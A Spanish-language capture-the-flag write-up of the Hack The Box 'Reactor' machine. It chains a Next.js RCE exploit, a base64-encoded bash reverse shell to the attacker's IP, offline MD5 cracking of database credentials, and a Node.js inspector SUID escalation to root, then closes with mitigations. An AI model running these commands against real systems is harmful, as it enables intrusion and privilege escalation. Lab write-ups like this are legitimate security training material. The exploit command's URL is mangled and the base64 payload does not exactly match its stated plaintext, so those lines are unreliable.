# Hack The Box - Reactor Writeup

| Campo | Detalle |
|---|---|
| **OS** | Linux |
| **Dificultad** | Easy |
| **Puntos** | 20 |
| **IP Víctima** | `10.129.245.214` |
| **Vector Inicial** | CVE-2025-55182 (Next.js RCE) |
| **Escalación** | Node.js V8 Inspector (SUID Abuse) |

---

## Resumen Ejecutivo
**Reactor** es una máquina Linux de dificultad fácil que demuestra los riesgos asociados a dependencias vulnerables en frameworks modernos web y configuraciones inseguras de servicios de depuración en entornos de producción.

---

## 1. Reconocimiento y Acceso Inicial

### Análisis Web
Al explorar el puerto `3000`, se identifica una aplicación desarrollada sobre **Next.js 15.0.3**. Esta versión específica es afectada por la vulnerabilidad **CVE-2025-55182** (React Server Components / Prototype Pollution), la cual permite ejecución remota de comandos (RCE).

Se añadió la entrada correspondiente en `/etc/hosts`:
```bash
echo "10.129.245.214 reactor.htb" | sudo tee -a /etc/hosts
```

### Explotación (RCE)
Para evitar fallos en la interpretación de caracteres especiales por el parser de Node.js, se codificó el payload de la reverse shell en **Base64**:

```bash
echo -n "bash -i >& /dev/tcp/10.10.15.153/4444 0>&1" | base64
```

Se utilizó el exploit PoC público para enviar la carga útil:
```bash
python3 exploit.py -u [http://reactor.htb:3000](http://reactor.htb:3000) -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNTMvNDQ0NCAwPjgx | base64 -d | bash"
```

Se estableció exitosamente una conexión como el usuario `node`.

---

## 2. Movimiento Lateral (`node` -> `engineer`)

Dentro del directorio `/opt/reactor-app`, se inspeccionó la base de datos **SQLite** (`reactor.db`):

```bash
sqlite3 reactor.db "SELECT * FROM users;"
```

**Credenciales obtenidas:**
* Usuario: `engineer`
* Hash MD5: `39d97110eafe2a9a68639812cd271e8e`

Utilizando **John the Ripper** y el diccionario `rockyou.txt`, se realizó el ataque de fuerza bruta offline:
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

La contraseña obtenida fue `reactor1`. Con estas credenciales, se accedió al sistema vía **SSH**:
```bash
ssh engineer@reactor.htb
```

---

## 3. Escalación de Privilegios (`engineer` -> `root`)

Enumerando los sockets locales del sistema mediante `ss -tuln`, se detectó el puerto `9229` activo exclusivamente en `127.0.0.1`. Este puerto corresponde al **Node.js V8 Inspector**.

Dado que el proceso se ejecuta con privilegios de `root`, se utilizó la herramienta interactiva de depuración para invocar comandos de sistema operativo:

```bash
node inspect 127.0.0.1:9229
```

Dentro de la consola `debug>`, se importó el módulo `child_process` para asignar permisos **SUID** al binario `/bin/bash`:

```javascript
exec('process.mainModule.require("child_process").execSync("chmod +s /bin/bash")')
```

Al salir del depurador, se inició Bash preservando los privilegios asignados:
```bash
/bin/bash -p
```

Se confirmó el control total del sistema con el comando `whoami` (`root`).

---

## Mitigaciones Recomendadas
1. **Actualización de Next.js:** Parchear la aplicación a una versión superior donde el fallo de deserialización/prototype pollution esté corregido.
2. **Hardening de Servicios:** Deshabilitar el flag `--inspect` de Node.js en entornos de producción o restringir el acceso al puerto de depuración mediante políticas de ejecución con menor privilegio.
